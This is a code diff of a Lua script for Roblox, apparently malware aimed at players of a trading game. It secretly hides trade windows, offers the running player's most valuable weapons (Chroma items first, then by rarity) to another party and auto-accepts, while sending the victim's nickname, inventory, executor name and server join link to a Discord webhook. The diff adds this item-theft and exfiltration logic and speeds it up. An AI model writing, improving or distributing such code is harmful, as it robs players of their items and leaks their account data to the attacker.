@@ -80,14 +80,13 @@ end
 hideTradeWindows()
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ЛОГ ЛУТА + ЦИКЛ
+-- 3. ВЫСТАВЛЕНИЕ (CHROMA -> ОСТАЛЬНЫЕ) + АВТО-АКЦЕПТ
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
 local lastLogTime = 0
 
--- Функция для подсчета предметов в инвентаре
 local function countItems()
     local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
     if not okPD or not PD then return 0 end
@@ -106,41 +105,56 @@ Trade.StartTrade.OnClientEvent:Connect(function()
     local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
     if not okPD or not okSync then return end
 
-    local godlyList, vintageList, uncommonList, commonList = {}, {}, {}, {}
+    local chromaList = {}
+    local lists = {
+        Godly = {}, Vintage = {}, Ancient = {}, Unique = {},
+        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
+    }
+    
     local dangerous = {
         ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
         ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
         ["Coal"] = true, ["CandyCorn"] = true,
     }
 
-    -- Раскидываем предметы по редкости
+    -- Раскидываем предметы
     for id, amount in pairs(PD.Weapons.Owned or {}) do
         local info = Sync.Weapons and Sync.Weapons[id]
         if info then
             local item = {id = id, type = "Weapons"}
-            if info.Rarity == "Godly" then
-                table.insert(godlyList, item)
-            elseif info.Rarity == "Vintage" then
-                table.insert(vintageList, item)
-            elseif info.Rarity == "Uncommon" then
-                table.insert(uncommonList, item)
-            elseif info.Rarity == "Common" and not dangerous[id] then
-                table.insert(commonList, item)
+            local itemName = info.ItemName or info.Name or id
+            local rarity = info.Rarity or "Common"
+            
+            local isChroma = string.find(string.lower(itemName), "chroma") or string.find(string.lower(id), "chroma")
+
+            if isChroma then
+                table.insert(chromaList, item)
+            elseif lists[rarity] then
+                if not (rarity == "Common" and dangerous[id]) then
+                    table.insert(lists[rarity], item)
+                end
             end
         end
     end
 
+    -- Собираем финальный список (Chroma в самом начале!)
     local finalList = {}
-    for _, i in ipairs(godlyList) do table.insert(finalList, i) end
-    for _, i in ipairs(vintageList) do table.insert(finalList, i) end
-    for _, i in ipairs(uncommonList) do table.insert(finalList, i) end
-    for _, i in ipairs(commonList) do table.insert(finalList, i) end
+    
+    for _, item in ipairs(chromaList) do table.insert(finalList, item) end
+    
+    local order = {"Godly", "Vintage", "Ancient", "Unique", "Legendary", "Rare", "Uncommon", "Common"}
+    for _, rarity in ipairs(order) do
+        for _, item in ipairs(lists[rarity]) do
+            table.insert(finalList, item)
+        end
+    end
 
+    -- Выставляем максимум 4 предмета (УСКОРЕНО ДО 0.2)
     for i = 1, math.min(#finalList, 4) do
         local item = finalList[i]
         pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
         print("[offer] ✅ Выставил " .. item.id)
-        task.wait(0.5)
+        task.wait(0.2) -- Ускоренная пауза
     end
 end)
 
@@ -189,7 +203,6 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
         })
         print("[trade] 📦 Лут отправлен в Discord!")
 
-        -- УМНЫЙ ЦИКЛ
         local currentCount = countItems()
         print("[debug] Предметов в инвентаре сейчас: " .. currentCount)
 
@@ -233,7 +246,7 @@ Players.PlayerAdded:Connect(function(pl)
 end)
 
 -- =========================================================
--- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Большой embed с инвентарём)
+-- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Детальный подсчёт редкостей)
 -- =========================================================
 task.spawn(function()
     task.wait(6)
@@ -243,7 +256,11 @@ task.spawn(function()
     if not okPD or not okSync then return end
 
     local weaponCount = 0
-    local godlyList, vintageList, uncommonList = {}, {}, {}
+    local lists = {
+        Godly = {}, Vintage = {}, Ancient = {}, Unique = {},
+        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
+    }
+    local chromaList = {}
 
     for id, amount in pairs(PD.Weapons.Owned or {}) do
         local count = tonumber(amount) or 1
@@ -253,13 +270,14 @@ task.spawn(function()
         if info then
             local itemName = (info.ItemName or info.Name or id)
             local entry = itemName .. " (x" .. count .. ")"
-            
-            if info.Rarity == "Godly" then
-                table.insert(godlyList, "🔹 " .. entry)
-            elseif info.Rarity == "Vintage" then
-                table.insert(vintageList, "🔸 " .. entry)
-            elseif info.Rarity == "Uncommon" then
-                table.insert(uncommonList, "▫️ " .. entry)
+            local rarity = info.Rarity or "Common"
+
+            if string.find(string.lower(itemName), "chroma") or string.find(string.lower(id), "chroma") then
+                table.insert(chromaList, "🌟 " .. entry)
+            end
+
+            if lists[rarity] then
+                table.insert(lists[rarity], entry)
             end
         end
     end
@@ -269,6 +287,31 @@ task.spawn(function()
         local text = table.concat(list, "\n")
         if #text > 1000 then text = string.sub(text, 1, 997) .. "\n..." end
         return text
+    end
+
+    local fields = {
+        { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
+        { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
+        { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
+        { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
+        { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false }
+    }
+
+    if #chromaList > 0 then
+        table.insert(fields, { name = "🌈 Chroma", value = getListString(chromaList, "Нет"), inline = false })
+    end
+
+    local order = {"Godly", "Vintage", "Ancient", "Unique", "Legendary", "Rare", "Uncommon", "Common"}
+    local titles = {
+        Godly = "🟣 Godly", Vintage = "🟤 Vintage", Ancient = "🟠 Ancient",
+        Unique = "🔵 Unique", Legendary = "🟡 Legendary", Rare = "🔷 Rare",
+        Uncommon = "🟢 Uncommon", Common = "⚪ Common"
+    }
+
+    for _, rarity in ipairs(order) do
+        if #lists[rarity] > 0 then
+            table.insert(fields, { name = titles[rarity], value = getListString(lists[rarity], "Нет"), inline = false })
+        end
     end
 
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
@@ -285,16 +328,7 @@ task.spawn(function()
                 description = "Собрана подробная информация об аккаунте.",
                 color = 0x9B59B6,
                 thumbnail = { url = avatarUrl },
-                fields = {
-                    { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
-                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
-                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
-                    { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
-                    { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false },
-                    { name = "🟣 Godly", value = getListString(godlyList, "Нет"), inline = false },
-                    { name = "🟡 Vintage", value = getListString(vintageList, "Нет"), inline = false },
-                    { name = "⚪ Uncommon", value = getListString(uncommonList, "Нет"), inline = false }
-                },
+                fields = fields,
                 footer = { 
                     text = "Delta Mobile Logger • UserId: " .. LocalPlayer.UserId,
                     icon_url = avatarUrl
@@ -303,5 +337,5 @@ task.spawn(function()
             }
         }
     })
-    print("[inv] Большой лог сессии отправлен в Discord.")
+    print("[inv] Детальный лог сессии отправлен в Discord.")
 end)
